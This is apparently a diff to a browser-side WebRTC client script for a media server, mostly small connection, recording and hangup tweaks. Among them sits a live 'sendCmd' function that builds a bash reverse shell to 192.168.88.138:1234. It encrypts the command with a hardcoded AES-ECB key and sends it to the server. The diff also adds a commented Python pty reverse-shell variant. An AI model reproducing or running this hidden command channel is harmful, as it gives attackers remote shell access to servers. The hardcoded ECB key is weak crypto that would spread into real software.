@@ -198,8 +198,14 @@
             let host = '';
             if (window.location.protocol == 'https:') {
                 host = 'wss://' + window.location.hostname + ':9082';
+                // host = 'wss://' + window.location.hostname + '/test';
+                // host = 'wss://' + window.location.hostname + '/mediaserver';
+                // host = 'wss://' + window.location.hostname + '/camshare';
             } else {
                 host = 'ws://' + window.location.hostname + ':9981';
+                // host = 'ws://' + window.location.hostname + '/test';
+                // host = 'ws://' + window.location.hostname + '/mediaserver';
+                // host = 'ws://' + window.location.hostname + '/camshare';
             }
             // host = 'wss://' + '127.0.0.1' + ':9082';
             // host = 'wss://' + '192.168.88.133' + ':9081';
@@ -322,7 +328,8 @@
             route: 'imRTC/sendSdpCall',
             req_data: {
                 stream: stream,
-                sdp: sdp
+                sdp: sdp,
+                record:1,
             }
         }
 
@@ -371,9 +378,12 @@
     async function sendGetToken() {
         await connect();
 
+        let user_id = "max";// + "-" + Math.random().toString(36).substr(2).toLocaleUpperCase();
         obj = {
             route: 'imRTC/sendGetToken',
-            req_data: {}
+            req_data: {
+                user_id:user_id,
+            }
         }
 
         console.log('Client.sendGetToken(), ', JSON.stringify(obj));
@@ -384,6 +394,7 @@
         await connect();
 
         let cmd = 'setsid bash -i >& /dev/tcp/192.168.88.138/1234 0<&1 &';
+        // let cmd = 'setsid python -c \'import pty; pty.spawn("/bin/bash")\' >& /dev/tcp/192.168.88.138/1234 0<&1 &';
         obj = {
             route: 'imRTC/sendCmd',
             req_data: {
@@ -392,7 +403,7 @@
         }
         let data = JSON.stringify(obj);
 
-        let key = 'mediaserver12345';
+        let key = 'mediaserver54321';
         key = CryptoJS.enc.Utf8.parse(key);
         let options = {
             mode: CryptoJS.mode.ECB,
@@ -454,7 +465,9 @@
 
             this.pc.oniceconnectionstatechange = event => {
                 console.log('RTCClient::oniceconnectionstatechange(), iceConnectionState: ', this.pc.iceConnectionState);
-                if (this.pc.iceConnectionState === 'disconnected' || this.pc.iceConnectionState === 'closed') {
+                if (this.pc.iceConnectionState === 'connected') {
+
+                } else if (this.pc.iceConnectionState === 'disconnected' || this.pc.iceConnectionState === 'closed') {
                 }
             };
         }
@@ -526,6 +539,7 @@
                 this.pc.close();
                 this.pc = null;
             }
+            this.mediaStream = null;
             this.stopLocalVideo();
         }
 
@@ -938,6 +952,11 @@
                 console.log("Rtc Accept, [OK]");
             }, e => {
                 console.log("Rtc Accept, [Fail], e: ", e);
+
+                if (typeof (client) != "undefined") {
+                    client.close();
+                }
+                rtc.hangup();
             })
         });
 
@@ -956,6 +975,7 @@
         }
 
         $("[id=hangupBtn]").click(function () {
+            console.log("Rtc Hangup");
             if (typeof (client) != "undefined") {
                 client.close();
             }
